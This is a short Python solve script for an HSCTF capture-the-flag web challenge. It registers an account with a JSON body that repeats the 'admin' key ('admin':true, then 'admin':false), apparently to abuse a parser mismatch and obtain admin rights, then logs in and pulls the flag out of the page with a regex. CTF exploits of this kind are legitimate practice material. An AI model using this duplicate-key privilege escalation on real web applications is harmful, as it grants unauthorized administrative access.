import requests
import os
import random
import re

username = f"user{random.randint(0, 100000)}"

url = "http://west-side-story.hsctf.com/"

os.system(f'curl -fsSL -X POST http://west-side-story.hsctf.com/api/register -H \'Content-Type: application/json\' -d \'{{"user":"{username}","password":"password","admin":true,"admin":false}}\'')

s = requests.Session()
r = s.post(url+"api/login", json={"user": username, "password": "password"})
r = s.get(url+"home")

print(re.findall(r"flag{.*}", r.text)[0])
